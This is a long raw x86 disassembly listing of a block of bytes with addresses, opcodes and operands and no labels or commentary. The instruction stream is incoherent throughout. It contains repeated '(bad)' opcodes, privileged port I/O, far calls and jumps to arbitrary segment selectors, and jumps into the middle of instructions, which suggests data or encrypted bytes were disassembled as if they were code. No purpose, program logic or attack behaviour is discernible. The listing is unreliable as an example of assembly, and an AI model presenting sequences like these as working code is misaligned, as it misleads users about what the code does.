  418dc6:	pinsrw mm2,WORD PTR [ecx],0xb2
  418dca:	push   ecx
  418dcb:	fild   WORD PTR [eax+eax*1]
  418dce:	ficomp DWORD PTR [esi+0x4e]
  418dd1:	dec    edi
  418dd2:	leave  
  418dd3:	lds    eax,FWORD PTR [edi+0x48199c71]
  418dd9:	outs   dx,BYTE PTR ds:[esi]
  418dda:	mov    ecx,0xd5571d3a
  418ddf:	cmp    eax,0x75fd957d
  418de4:	inc    ebp
  418de5:	mov    al,ds:0x60e382cb
  418dea:	ja     0x418dd5
  418dec:	pop    esi
  418ded:	cld    
  418dee:	out    dx,eax
  418def:	mov    bh,cl
  418df1:	pop    ebx
  418df2:	jnp    0x418dcc
  418df4:	dec    esi
  418df5:	jo     0x418ddc
  418df7:	xchg   edi,eax
  418df8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418df9:	and    al,0x16
  418dfb:	xchg   edi,edx
  418dfd:	inc    ecx
  418dfe:	je     0x418e7e
  418e00:	or     BYTE PTR [ecx+0x4c],0x68
  418e04:	lods   al,BYTE PTR ds:[esi]
  418e05:	loope  0x418d9f
  418e07:	outs   dx,DWORD PTR ds:[esi]
  418e08:	mov    bl,BYTE PTR [ebx+0x4b]
  418e0b:	cmp    DWORD PTR [esp+edi*4+0x518ad3e],ebx
  418e12:	scas   al,BYTE PTR es:[edi]
  418e13:	and    bh,al
  418e15:	mov    ds,WORD PTR [edi]
  418e17:	push   ebp
  418e18:	mov    ebx,0x4664090e
  418e1d:	loopne 0x418e39
  418e1f:	(bad)  
  418e20:	test   eax,0xc86bc0c1
  418e25:	xchg   ecx,eax
  418e26:	push   eax
  418e27:	lods   eax,DWORD PTR ds:[esi]
  418e28:	jb     0x418e31
  418e2a:	popa   
  418e2b:	data16 jl 0x418dd0
  418e2e:	push   ebx
  418e2f:	fsub   QWORD PTR [esi-0x79]
  418e32:	dec    eax
  418e33:	cs pusha 
  418e35:	dec    edi
  418e36:	mov    bh,0x70
  418e38:	jne    0x418e64
  418e3a:	popa   
  418e3b:	inc    esp
  418e3c:	and    DWORD PTR [eax+esi*8+0xf],0xffffffe3
  418e41:	shl    BYTE PTR [ecx],1
  418e43:	shl    DWORD PTR [esi+0x3c],0xc2
  418e47:	jmp    0x418e27
  418e49:	stos   BYTE PTR es:[edi],al
  418e4a:	daa    
  418e4b:	jp     0x418e30
  418e4d:	call   0x54c7:0xc08faaac
  418e54:	xor    eax,0xb02c13b6
  418e59:	pop    edi
  418e5a:	mov    bl,0x56
  418e5c:	cmp    edx,DWORD PTR [ecx+0x3bdb842]
  418e62:	add    BYTE PTR [ebp-0x742a9c00],0xec
  418e69:	pop    ss
  418e6a:	(bad)  
  418e6b:	mov    ebx,0x56e1e8c8
  418e70:	div    BYTE PTR [edi]
  418e72:	pop    ecx
  418e73:	retf   0x7cf2
  418e76:	cmp    DWORD PTR [ebp+0x7c9f4deb],esp
  418e7c:	pusha  
  418e7d:	push   ebp
  418e7e:	xchg   edi,eax
  418e7f:	and    eax,DWORD PTR [edi]
  418e81:	sub    DWORD PTR [edi-0x26],0x6d57031a
  418e88:	call   0x80e9:0x6b409d25
  418e8f:	fstp   DWORD PTR [ebx+0x1a]
  418e92:	and    ecx,DWORD PTR [edx]
  418e94:	ret    0x2784
  418e97:	cli    
  418e98:	adc    esi,DWORD PTR [edx+ebx*8]
  418e9b:	inc    ecx
  418e9c:	pop    ss
  418e9d:	sub    edi,DWORD PTR [ebp+0x6efeeb65]
  418ea3:	lods   al,BYTE PTR ds:[esi]
  418ea4:	mov    bh,0xac
  418ea6:	add    bh,BYTE PTR [ecx-0x1d798637]
  418eac:	arpl   WORD PTR [esi],si
  418eae:	rcl    BYTE PTR [esi],1
  418eb0:	push   ds
  418eb1:	scas   al,BYTE PTR es:[edi]
  418eb2:	inc    esp
  418eb3:	shr    BYTE PTR [edi-0x4a],cl
  418eb6:	and    al,ah
  418eb8:	nop
  418eb9:	hlt    
  418eba:	es xchg ebp,eax
  418ebc:	sti    
  418ebd:	lahf   
  418ebe:	mov    eax,0x367da4f8
  418ec3:	or     eax,0xb3454d0e
  418ec8:	mov    edi,0x51896813
  418ecd:	pop    edi
  418ece:	adc    esi,0xbfb3fca4
  418ed4:	and    al,BYTE PTR [ebx-0x42]
  418ed7:	jp     0x418ee3
  418ed9:	sbb    al,0xc5
  418edb:	xor    DWORD PTR [edx-0x1c],esp
  418ede:	mul    DWORD PTR [ecx+eiz*8+0x41]
  418ee2:	test   eax,0x9d56f4a5
  418ee7:	es daa 
  418ee9:	inc    esp
  418eea:	mov    esp,0xe176a67b
  418eef:	popf   
  418ef0:	scas   al,BYTE PTR es:[edi]
  418ef1:	shl    BYTE PTR [edi-0x482cfa06],1
  418ef7:	cmp    al,0xc5
  418ef9:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418efb:	ja     0x418edf
  418efd:	ins    BYTE PTR es:[edi],dx
  418efe:	loope  0x418f15
  418f00:	adc    DWORD PTR [ecx+0x462667dd],ebx
  418f06:	pop    esp
  418f07:	mov    DWORD PTR [esi+0x52258c2a],0xed18fdd2
  418f11:	pop    edi
  418f12:	retf   0x7077
  418f15:	adc    DWORD PTR ds:0xcd416d30,0x5345a5eb
  418f1f:	mov    WORD PTR [ebp-0x78c40c38],fs
  418f25:	mov    ds:0xc025dc8f,eax
  418f2a:	cli    
  418f2b:	das    
  418f2c:	xchg   esi,eax
  418f2d:	dec    BYTE PTR [eax-0x60252fd5]
  418f33:	mul    ebx
  418f35:	inc    ecx
  418f36:	scas   eax,DWORD PTR es:[edi]
  418f37:	sub    DWORD PTR [edi],edi
  418f39:	adc    edx,0xfd4f0408
  418f3f:	std    
  418f40:	or     ch,BYTE PTR [ebp-0x55]
  418f43:	ss push edi
  418f45:	xchg   ecx,eax
  418f46:	repz dec ebx
  418f48:	xchg   edi,eax
  418f49:	call   0xe85a:0x50e87fe9
  418f50:	cmp    DWORD PTR [edi],edi
  418f52:	repnz and ch,0xb7
  418f56:	lods   al,BYTE PTR ds:[esi]
  418f57:	fs out 0xa3,eax
  418f5a:	loop   0x418f7b
  418f5c:	retf   
  418f5d:	sub    ebp,DWORD PTR [edx]
  418f5f:	jp     0x418f86
  418f61:	xchg   esp,eax
  418f62:	dec    esp
  418f63:	lahf   
  418f64:	daa    
  418f65:	adc    esi,DWORD PTR [edx-0x75]
  418f68:	mov    eax,ds:0x1b40eb59
  418f6d:	push   ds
  418f6e:	out    0x71,al
  418f70:	nop
  418f71:	stos   DWORD PTR es:[edi],eax
  418f72:	call   0x7e78:0x4d405131
  418f79:	lahf   
  418f7a:	xor    BYTE PTR [edx-0x3c],0x2e
  418f7e:	or     DWORD PTR [eax+0x7a7e6c42],edi
  418f84:	inc    esi
  418f85:	and    eax,0x88eaeabc
  418f8a:	loope  0x418fde
  418f8c:	ds aaa 
  418f8e:	(bad)
  418f91:	ret    
  418f92:	sti    
  418f93:	imul   ebx,DWORD PTR [esp+ebp*1-0x37],0x303e2802
  418f9b:	loope  0x418f30
  418f9d:	cdq    
  418f9e:	push   esi
  418f9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418fa0:	mov    cl,BYTE PTR [esi-0x4a807c14]
  418fa6:	jmp    0x2af3:0x188d2a0d
  418fad:	push   0xa59ca237
  418fb2:	xchg   ebp,eax
  418fb3:	xchg   esp,eax
  418fb4:	add    eax,0x91f39e9e
  418fb9:	add    eax,0x3ae9d503
  418fbe:	or     eax,0xac7c539
  418fc3:	mov    esp,DWORD PTR cs:[ebx]
  418fc6:	xor    eax,0x8c7b5695
  418fcb:	xchg   edi,eax
  418fcc:	cdq    
  418fcd:	(bad)  [ebx-0x34]
  418fd0:	lods   eax,DWORD PTR ds:[esi]
  418fd1:	xchg   esi,eax
  418fd2:	inc    eax
  418fd3:	in     eax,dx
  418fd4:	out    0x76,eax
  418fd6:	out    0x61,al
  418fd8:	dec    ebx
  418fd9:	sub    al,0x99
  418fdb:	mov    dl,0x99
  418fdd:	pop    ss
  418fde:	add    eax,0xd360faa2
  418fe3:	fldcw  WORD PTR [ebp-0x79c88cab]
  418fe9:	popf   
  418fea:	in     al,0x11
  418fec:	mov    eax,ds:0x7b1f399a
  418ff1:	add    al,0xca
  418ff3:	in     al,dx
  418ff4:	sub    bh,BYTE PTR [edx]
  418ff6:	mov    esp,0xf9b25741
  418ffb:	sub    BYTE PTR [edi],cl
  418ffd:	pop    ebp
  418ffe:	or     ebx,edi
  419000:	cmp    al,0x44
  419002:	xchg   edx,eax
  419003:	mov    esi,0x61a60826
  419008:	std    
  419009:	and    al,0xc7
  41900b:	frstor [ebx+0x7cfc11f7]
  419011:	fldcw  WORD PTR [edx-0x70]
  419014:	ds iret 
  419016:	loopne 0x419042
  419018:	lock mov WORD PTR [edi+esi*8],?
  41901c:	(bad)  
  41901d:	jb     0x418fd8
  41901f:	and    edx,DWORD PTR [ecx-0x77]
  419022:	mov    bh,0x3c
  419024:	imul   esp,DWORD PTR [ecx],0xeb1d6d17
  41902a:	icebp  
  41902b:	push   ebx
  41902c:	push   ecx
  41902d:	mov    cl,bh
  41902f:	or     al,0x5d
  419031:	in     al,0xa0
  419033:	ins    BYTE PTR es:[edi],dx
  419034:	sbb    esi,DWORD PTR [esi-0x40]
  419037:	mov    ebp,0x73b0fd0d
  41903c:	inc    ebp
  41903d:	in     eax,0xb3
  41903f:	stos   BYTE PTR es:[edi],al
  419040:	dec    edi
  419041:	das    
  419042:	or     BYTE PTR [ebp+0x391cbe44],bh
  419048:	dec    ebx
  419049:	sbb    al,0x62
  41904b:	leave  
  41904c:	das    
  41904d:	ins    BYTE PTR es:[edi],dx
  41904e:	push   ebp
  41904f:	inc    eax
  419050:	(bad)  
  419051:	jmp    0x76b3:0x46b6e31a
  419058:	adc    al,0xbe
  41905a:	std    
  41905b:	aad    0x55
  41905d:	mov    DWORD PTR gs:[ebp+0x25],edx
  419061:	and    eax,0x24b9bc86
  419066:	scas   eax,DWORD PTR es:[edi]
  419067:	lock ror BYTE PTR [ebx+0x7d],0xfd
  41906c:	sbb    eax,0x2dd05fe0
  419071:	adc    ah,BYTE PTR [eax+0x73]
  419074:	cmp    BYTE PTR [esi],ch
  419076:	mov    dh,0x58
  419078:	sbb    eax,0xa9ad9042
  41907d:	ret    
  41907e:	mov    DWORD PTR [eax+0x7b324851],eax
  419084:	ins    DWORD PTR es:[edi],dx
  419085:	cs popa 
  419087:	or     eax,0x4e9aa40a
  41908c:	or     BYTE PTR [ecx+0x7c6fd137],ch
  419092:	(bad)  
  419093:	push   ss
  419094:	stos   BYTE PTR es:[edi],al
  419095:	call   0x5203:0x69b7c63
  41909c:	loopne 0x4190c5
  41909e:	lods   eax,DWORD PTR ds:[esi]
  41909f:	lahf   
  4190a0:	xor    ebp,esp
  4190a2:	icebp  
  4190a3:	adc    eax,0xb05f899a
  4190a8:	push   esi
  4190a9:	jge    0x419050
  4190ab:	or     BYTE PTR [ebx],0x26
  4190ae:	push   esi
  4190af:	dec    esi
  4190b0:	mov    bh,dl
  4190b2:	lds    edx,FWORD PTR [esi+0x4866aebb]
  4190b8:	cdq    
  4190b9:	and    ebx,DWORD PTR [esi-0x22e02c63]
  4190bf:	cmp    al,BYTE PTR [ebx-0x11a10315]
  4190c5:	hlt    
  4190c6:	(bad)  
  4190c7:	jl     0x4190c9
  4190c9:	je     0x41911f
  4190cb:	add    al,0x9e
  4190cd:	push   esi
  4190ce:	push   es
  4190cf:	mov    ebp,0x5810708d
  4190d4:	sti    
  4190d5:	fdivrp st(3),st
  4190d7:	lea    esi,[ecx-0x43]
  4190da:	inc    ebx
  4190db:	rcl    DWORD PTR ds:0xadd4b117,cl
  4190e1:	gs hlt 
  4190e3:	mov    dh,BYTE PTR [ecx]
  4190e5:	enter  0xe990,0x11
  4190e9:	mov    edx,0x8b83b105
  4190ee:	(bad)  
  4190ef:	dec    esi
  4190f0:	mov    ?,WORD PTR [eax-0x3c27e8ad]
  4190f6:	jns    0x4190cb
  4190f8:	fild   WORD PTR [esi-0x3352f2c3]
  4190fe:	aaa    
  4190ff:	pop    eax
  419100:	js     0x4190f5
  419102:	ret    
  419103:	mov    ah,0x88
  419105:	jle    0x419178
  419107:	in     al,0xb3
  419109:	sbb    al,0x70
  41910b:	xchg   ecx,eax
  41910c:	jmp    0x4190e9
  41910e:	mov    ds:0x3aedba00,eax
  419113:	rcr    BYTE PTR [eax],1
  419115:	(bad)  
  419116:	pop    ebx
  419117:	pop    esp
  419118:	mov    ds:0xbeb7153a,al
  41911d:	push   ss
  41911e:	sbb    esi,ebp
  419120:	fnstenv [edx+0x7d]
  419123:	hlt    
  419124:	pop    ss
  419125:	(bad)  
  419126:	xor    al,0x99
  419128:	xor    DWORD PTR [ebx],0x3e
  41912b:	mov    WORD PTR [ecx+0x64],gs
  41912e:	jl     0x419102
  419130:	jle    0x419178
  419132:	das    
  419133:	push   cs
  419134:	dec    esi
  419135:	cmp    al,0x2f
  419137:	fcmovnb st,st(5)
  419139:	sub    al,0x83
  41913b:	or     al,0xbd
  41913d:	mov    edx,0x84255323
  419142:	pop    ss
  419143:	pop    ecx
  419144:	into   
  419145:	call   0xaabe:0xb123ac84
  41914c:	jmp    0x36d6871d
  419151:	mov    edi,0xf83e0ead
  419156:	pop    ebx
  419157:	loope  0x419153
  419159:	das    
  41915a:	pop    edi
  41915b:	push   edx
  41915c:	test   al,0xd4
  41915e:	cmc    
  41915f:	mov    WORD PTR [ecx+ebx*8+0x7e],cs
  419163:	pop    ebp
  419164:	jg     0x419164
  419166:	and    DWORD PTR [eax],esp
  419168:	sub    esp,esp
  41916a:	iret   
  41916b:	ja     0x419178
  41916d:	adc    al,0x92
  41916f:	push   ss
  419170:	xchg   esi,eax
  419171:	push   0xc007ccb
  419176:	xor    eax,0x987d748a
  41917b:	jl     0x419197
  41917d:	jmp    0x41916d
  41917f:	push   edx
  419180:	ja     0x419105
  419182:	test   DWORD PTR [edi+0x63],edi
  419185:	xor    al,0xe8
  419187:	xchg   bx,ax
  419189:	push   0x96d0bf1f
  41918e:	idiv   DWORD PTR [ecx]
  419190:	repz je 0x41920e
  419193:	pop    eax
  419194:	loop   0x419186
  419196:	in     eax,0xc3
  419198:	lock or al,0x1d
  41919b:	les    eax,FWORD PTR ds:0xe9c3a48b
  4191a1:	pop    ss
  4191a2:	les    ebx,FWORD PTR [ebp+0x6d29e11d]
  4191a8:	(bad)  {k5}{z}
  4191ad:	xchg   edi,eax
  4191ae:	cli    
  4191af:	fs imul esi,eax,0x50dc9cf0
  4191b6:	xchg   esp,edx
  4191b8:	aaa    
  4191b9:	xchg   ebp,eax
  4191ba:	inc    ecx
  4191bb:	push   edx
  4191bc:	mov    DWORD PTR [ebx-0x3a],ecx
  4191bf:	mov    ecx,0x52b42c55
  4191c4:	bound  ebp,QWORD PTR ds:0xe133976a
  4191ca:	sub    eax,edi
  4191cc:	sub    bh,BYTE PTR [eax-0x77]
  4191cf:	fdivr  DWORD PTR [esi+edi*4]
  4191d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4191d3:	fmul   QWORD PTR [edx+ecx*8-0x1f]
  4191d7:	dec    eax
  4191d8:	mov    ch,0x2f
  4191da:	or     al,BYTE PTR [ebp-0x303d2567]
  4191e0:	jo     0x419189
  4191e2:	mov    cs,WORD PTR [eax+0x73]
  4191e5:	shl    DWORD PTR [ebx],cl
  4191e7:	fucomp st(6)
  4191e9:	lds    ebp,FWORD PTR [eax+0x60]
  4191ec:	or     al,0xad
  4191ee:	mov    ch,0x55
  4191f0:	xor    ah,BYTE PTR [eax]
  4191f2:	mov    eax,0x6c7d9148
  4191f7:	mov    dl,0x72
  4191f9:	push   ss
  4191fa:	mov    bl,0x99
  4191fc:	cs sbb eax,0x52bc261f
  419202:	cmc    
  419203:	mov    BYTE PTR [edx+ecx*1],bh
  419206:	stos   DWORD PTR es:[edi],eax
  419207:	nop
  419208:	pop    edi
  419209:	xchg   esi,eax
  41920a:	test   eax,0xc3c379
  41920f:	ret    
  419210:	(bad)  
  419211:	sub    BYTE PTR [eax],cl
  419213:	push   ds
  419214:	outs   dx,BYTE PTR ds:[esi]
  419215:	mov    ds:0x905f44c0,al
  41921a:	mov    edi,DWORD PTR [eax]
  41921c:	mov    esi,0x13336573
  419221:	sub    DWORD PTR [eax-0x20],ecx
  419224:	mov    ds:0x39137b26,al
  419229:	push   esp
  41922a:	pop    edx
  41922b:	test   esp,eax
  41922d:	push   esi
  41922e:	mov    esi,0xc31da607
  419233:	mov    esp,0xa961a958
  419238:	repnz and al,0x4b
  41923b:	and    ch,BYTE PTR [edx]
  41923d:	popa   
  41923e:	dec    ebp
  41923f:	mov    dl,0x87
  419241:	retf   0xa8f1
  419244:	out    0x5e,eax
  419246:	ret    0x8e35
  419249:	repz int 0xf1
  41924c:	xchg   ebx,eax
  41924d:	jo     0x4192a3
  41924f:	shrd   DWORD PTR [ebx-0x68],esp,0x52
  419254:	adc    al,0xef
  419256:	lock rol ebx,1
  419259:	dec    edi
  41925a:	rcr    BYTE PTR [edi+ecx*1+0x1a998848],0x16
  419262:	iret   
  419263:	fs shl bl,1
  419266:	and    bl,0x28
  419269:	test   al,0xf0
  41926b:	add    eax,DWORD PTR [edi-0x33c90603]
  419271:	or     ecx,edi
  419273:	in     eax,dx
  419274:	pop    esp
  419275:	neg    BYTE PTR [ebp+edx*2+0x5c09ec88]
  41927c:	xchg   ecx,eax
  41927d:	into   
  41927e:	outs   dx,DWORD PTR ds:[esi]
  41927f:	cdq    
  419280:	mov    ebp,0x4fea7752
  419285:	mov    ds:0x14f12ca6,al
  41928a:	adc    eax,0x3613a022
  41928f:	sti    
  419290:	ret    
  419291:	add    dh,bl
  419293:	movhps xmm2,QWORD PTR [edi]
  419296:	sahf   
  419297:	aad    0xb2
  419299:	sub    eax,0x86a3a183
  41929e:	pop    edi
  41929f:	fwait
  4192a0:	aaa    
  4192a1:	jg     0x41923a
  4192a3:	dec    eax
  4192a4:	inc    edi
  4192a5:	ja     0x4192d7
  4192a7:	fisub  DWORD PTR [ebx]
  4192a9:	push   edx
  4192aa:	sbb    DWORD PTR [ecx-0x33834d8a],esi
  4192b0:	cwde   
  4192b1:	cmp    BYTE PTR [edx+0x63bbb56b],dh
  4192b7:	jl     0x41923b
  4192b9:	dec    eax
  4192ba:	out    0x85,eax
  4192bc:	mov    ebx,0xceec6053
  4192c1:	mov    ds:0x1b201432,eax
  4192c6:	lds    eax,FWORD PTR [eax+ebp*4-0x7dec950e]
  4192cd:	push   ds
  4192ce:	(bad)  
  4192cf:	es jnp 0x4192dd
  4192d2:	sahf   
  4192d3:	ficomp DWORD PTR [ebp-0x15450e87]
  4192d9:	rol    DWORD PTR [ebx],1
  4192db:	ret    
  4192dc:	fadd   st(3),st
  4192de:	les    esi,FWORD PTR [ecx+0x79356e0a]
  4192e4:	jmp    0x133b:0xa0c2911d
  4192eb:	inc    ecx
  4192ec:	addr16 push ebx
  4192ee:	icebp  
  4192ef:	loopne 0x419344
  4192f1:	push   cs
  4192f2:	(bad)  
  4192f4:	(bad)  ss:[edx-0x10e55bb8]
  4192fb:	mov    ebp,0x41fce11a
  419300:	int    0x89
  419302:	sbb    eax,0x47ac67d3
  419307:	ss sbb esp,ebx
  41930a:	loope  0x419302
  41930c:	add    dl,BYTE PTR [ebp-0x3e]
  41930f:	imul   eax,ebx,0xd8803e2e
  419315:	sbb    ebp,DWORD PTR [edi+edi*2-0x73]
  419319:	mov    dh,BYTE PTR [edx+0x2cf12bc8]
  41931f:	pop    ds
  419320:	lods   eax,DWORD PTR ds:[esi]
  419321:	push   cs
  419322:	lock pop edx
  419324:	push   ebx
  419325:	test   BYTE PTR [edi-0x657c6b52],0x47
  41932c:	mov    al,ds:0x4ddcb48a
  419331:	ficom  DWORD PTR [ebx]
  419333:	xchg   esi,eax
  419334:	and    al,0xc
  419336:	test   al,0x37
  419338:	lahf   
  419339:	mov    bl,0x78
  41933b:	aam    0x5
  41933d:	ja     0x419378
  41933f:	fnstsw WORD PTR [ebx+0x184aded6]
  419345:	xor    eax,0xa3d8d05b
  41934a:	jne    0x4192f2
  41934c:	popf   
  41934d:	ja     0x4192ed
  41934f:	or     ebx,DWORD PTR [esi]
  419351:	pop    ebx
  419352:	mov    edx,0x2cd1185f
  419357:	mov    esi,0x911f436
  41935c:	je     0x419351
  41935e:	mov    ds:0xe5fecf05,eax
  419363:	and    DWORD PTR [ebp-0x53],ebp
  419366:	cs jbe 0x419369
  419369:	fadd   QWORD PTR [edx+0x167446a5]
  41936f:	xchg   edx,eax
  419370:	xor    al,0xc3
  419372:	cmp    ch,ah
  419374:	mov    dh,0x33
  419376:	loopne 0x4193cf
  419378:	sub    al,0xca
  41937a:	fsubr  DWORD PTR [edi-0x24eede14]
  419380:	inc    esp
  419381:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419382:	out    0x99,eax
  419384:	mov    edx,0xcf63b9ff
  419389:	lods   eax,DWORD PTR ds:[esi]
  41938a:	fcos   
  41938c:	and    BYTE PTR [eax-0x3bdf4e5f],al
  419392:	push   ebp
  419393:	dec    ebp
  419394:	out    dx,eax
  419395:	jmp    DWORD PTR [edx]
  419397:	fs out dx,eax
  419399:	or     bl,BYTE PTR [eax+0x64]
  41939c:	ret    
  41939d:	call   0x96c4:0x7c40955e
  4193a4:	pop    ebp
  4193a5:	adc    al,dh
  4193a7:	jae    0x4193a2
  4193a9:	ins    DWORD PTR es:[edi],dx
  4193aa:	mov    DWORD PTR [ecx-0x61],esp
  4193ad:	add    eax,0x577ac7e6
  4193b2:	cwde   
  4193b3:	ret    0xbbe9
  4193b6:	dec    ebx
  4193b7:	ret    0xb55c
  4193ba:	pushf  
  4193bb:	and    al,ah
  4193bd:	js     0x4193a0
  4193bf:	sbb    ecx,esi
  4193c1:	popa   
  4193c2:	inc    ecx
  4193c3:	and    BYTE PTR [ebx-0x5e],bl
  4193c6:	mov    eax,ds:0x16261456
  4193cb:	xchg   ecx,eax
  4193cc:	or     eax,0xb941967e
  4193d1:	fnstenv [esp+esi*2]
  4193d4:	gs pop ds
  4193d6:	inc    esi
  4193d7:	mov    dh,0xe3
  4193d9:	or     ebx,esi
  4193db:	lods   eax,DWORD PTR ds:[esi]
  4193dc:	neg    dh
  4193de:	jae    0x4193db
  4193e0:	push   eax
  4193e1:	int    0x91
  4193e3:	sub    DWORD PTR [ebx],0xffffff8d
  4193e6:	arpl   WORD PTR [edx-0x57],cx
  4193e9:	outs   dx,BYTE PTR ds:[esi]
  4193ea:	retf   0xee0f
  4193ed:	hlt    
  4193ee:	and    edi,0x49807d3c
  4193f4:	int3   
  4193f5:	repnz mov dh,0xef
  4193f8:	add    al,0xf7
  4193fa:	iret   
  4193fb:	mov    dl,bh
  4193fd:	push   esi
  4193fe:	repnz mov ebp,0x7ed03c75
  419404:	pop    esp
  419405:	cs push ss
  419407:	loope  0x4193e6
  419409:	mov    esi,0xe6480ddf
  41940e:	mov    bl,0x8
  419410:	and    DWORD PTR [ebx+0x3f9db2a0],0xffffffcd
  419417:	and    BYTE PTR [eax+0x57],0xb1
  41941b:	data16 into 
  41941d:	psrad  mm0,QWORD PTR ds:0xa1ef543b
  419424:	xor    eax,0xd7b42741
  419429:	js     0x419400
  41942b:	leave  
  41942c:	cwde   
  41942d:	ficomp WORD PTR [ecx+0x3ccda160]
  419433:	adc    ch,0x1e
  419436:	int    0x4c
  419438:	test   eax,0xa1b57aad
  41943d:	and    BYTE PTR [esi],cl
  41943f:	repz push 0xc65b44ab
  419445:	and    al,0x50
  419447:	push   esi
  419448:	xor    DWORD PTR [ebx-0x6b],0x7b
  41944c:	sbb    DWORD PTR [ecx-0x160b10ad],edi
  419452:	stos   BYTE PTR es:[edi],al
  419453:	in     eax,dx
  419454:	mov    eax,0xc6a43cc3
  419459:	cmp    al,0x95
  41945b:	retf   
  41945c:	pop    ss
  41945d:	(bad)  
  41945e:	cmp    ebp,ebx
  419460:	and    eax,0xdd32ccb2
  419465:	fst    DWORD PTR [ecx]
  419467:	pusha  
  419468:	sbb    al,0xcb
  41946a:	mov    ebx,0xd641f097
  41946f:	cmp    DWORD PTR [ebx+0x4d112140],esp
  419475:	ret    0x35b9
  419478:	fcomp  st(7)
  41947a:	shr    BYTE PTR [esp+eiz*2],1
  41947d:	push   edx
  41947e:	outs   dx,DWORD PTR ds:[esi]
  41947f:	shl    ah,1
  419481:	adc    eax,0xe801d180
  419486:	adc    BYTE PTR ds:0x8b2096dc,0x85
  41948d:	sbb    BYTE PTR [ebp-0xe],cl
  419490:	ins    DWORD PTR es:[edi],dx
  419491:	push   ecx
  419492:	sub    BYTE PTR [edx],dh
  419494:	or     eax,DWORD PTR [esi-0x828022b]
  41949a:	outs   dx,DWORD PTR ds:[esi]
  41949b:	bound  eax,QWORD PTR [ebp-0x15]
  41949e:	sbb    DWORD PTR [esi+0x79],ecx
  4194a1:	push   edx
  4194a2:	mov    ch,0xb5
  4194a4:	jge    0x419486
  4194a6:	stos   BYTE PTR es:[edi],al
  4194a7:	lods   al,BYTE PTR ds:[esi]
  4194a8:	fsub   QWORD PTR [eax+0x47155b87]
  4194ae:	mov    gs,WORD PTR [esi-0x1f]
  4194b1:	addr16 hlt 
  4194b3:	sti    
  4194b4:	mov    BYTE PTR [eax],cl
  4194b6:	add    eax,0x6fdadc1e
  4194bb:	loop   0x41950e
  4194bd:	rcr    ah,1
  4194bf:	shr    esp,cl
  4194c1:	mov    ebp,0xe5134a3
  4194c6:	(bad)  
  4194c7:	mov    esp,0xaab61c2e
  4194cc:	xchg   DWORD PTR [ecx-0x1b],ebx
  4194cf:	sub    eax,0xb7eb11af
  4194d4:	fcomi  st,st(6)
  4194d6:	add    bl,BYTE PTR [ebx-0x15d2e143]
  4194dc:	(bad)  
  4194dd:	ret    
  4194de:	mov    WORD PTR [ecx-0x5251a8b1],ds
  4194e4:	add    ecx,DWORD PTR [ebx+eax*8]
  4194e7:	add    dl,BYTE PTR [eax]
  4194e9:	sub    BYTE PTR [edx],bh
  4194eb:	push   ebp
  4194ec:	imul   edi,DWORD PTR [ebx+0x16],0xa7e2246b
  4194f3:	lahf   
  4194f4:	mov    al,0x67
  4194f6:	pop    edx
  4194f7:	mov    al,ds:0xc158ec8a
  4194fc:	aaa    
  4194fd:	sub    eax,DWORD PTR [edi]
  4194ff:	mov    ?,edi
  419501:	adc    BYTE PTR [edi],dh
  419503:	cmp    al,0xbc
  419505:	test   eax,0x3a16c305
  41950a:	dec    ebx
  41950b:	out    dx,eax
  41950c:	jns    0x419540
  41950e:	outs   dx,DWORD PTR ds:[esi]
  41950f:	and    BYTE PTR [esi],cl
  419511:	shl    DWORD PTR [ecx-0x4c],cl
  419514:	push   ecx
  419515:	dec    edi
  419516:	shl    edi,1
  419518:	add    bh,BYTE PTR [ecx+0x4636affe]
  41951e:	gs inc esi
  419520:	in     al,0x8d
  419522:	pop    edx
  419523:	call   0x45de5254
  419528:	xchg   ebx,eax
  419529:	or     al,0xda
  41952b:	sub    esi,DWORD PTR [edx-0x43]
  41952e:	xor    ch,dh
  419530:	test   eax,0xb71bd78f
  419535:	fimul  DWORD PTR [eax+0x72]
  419538:	inc    ecx
  419539:	xlat   BYTE PTR ds:[ebx]
  41953a:	(bad)  
  41953b:	xor    eax,0x1fa256fd
  419540:	mov    ecx,0x830e1d4a
  419546:	retf   0x7329
  419549:	mov    ch,0xd1
  41954b:	dec    ebp
  41954c:	test   DWORD PTR [edx],ecx
  41954e:	imul   BYTE PTR [ecx]
  419550:	popa   
  419551:	pop    edx
  419552:	dec    ebx
  419553:	jbe    0x419533
  419555:	enter  0x7566,0x1e
  419559:	inc    edi
  41955a:	clc    
  41955b:	mov    eax,ds:0xbd81c928
  419560:	cmp    DWORD PTR [edx-0x408d2d1e],ecx
  419566:	dec    ebx
  419567:	es push esi
  419569:	push   edi
  41956a:	sub    esi,DWORD PTR cs:[ecx+eiz*8+0x7941ab42]
  419572:	xor    DWORD PTR [eax],esi
  419574:	dec    eax
  419575:	sbb    bl,bh
  419577:	js     0x41957a
  419579:	sub    DWORD PTR [esi+0x24],0x721b10ce
  419580:	fnstcw WORD PTR [edi-0x28f653ed]
  419586:	dec    eax
  419587:	dec    edi
  419588:	pop    ebx
  419589:	mov    dh,0x37
  41958b:	pop    esp
  41958c:	iret   
  41958d:	sbb    BYTE PTR [ecx-0x64],ch
  419590:	cs icebp 
  419592:	jg     0x419525
  419594:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419595:	jb     0x4195a9
  419597:	call   0x9713:0xa8f9a7cb
  41959e:	scas   eax,DWORD PTR es:[edi]
  41959f:	das    
  4195a0:	pop    ds
  4195a1:	repz pop ecx
  4195a3:	mov    ds:0xebeddf52,eax
  4195a8:	fadd   QWORD PTR [eax+0x3b]
  4195ab:	setl   BYTE PTR [esi-0x5f4de5c6]
  4195b2:	pop    ebx
  4195b3:	add    DWORD PTR [edx-0x6b8bf505],edx
  4195b9:	popa   
  4195ba:	mov    esi,0xd80d10ae
  4195bf:	jne    0x419610
  4195c1:	xor    eax,0x27b65838
  4195c6:	sti    
  4195c7:	jno    0x419554
  4195c9:	dec    edx
  4195ca:	test   DWORD PTR ds:0x54b241c,ebx
  4195d0:	add    ebx,DWORD PTR ds:0x262fed7d
  4195d6:	jb     0x419624
  4195d8:	sbb    al,0xef
  4195da:	enter  0x656b,0x16
  4195de:	lods   al,BYTE PTR ds:[esi]
  4195df:	jbe    0x4195b7
  4195e1:	jbe    0x4195a0
  4195e3:	es adc dh,0x74
  4195e7:	leave  
  4195e8:	leave  
  4195e9:	jecxz  0x4195e2
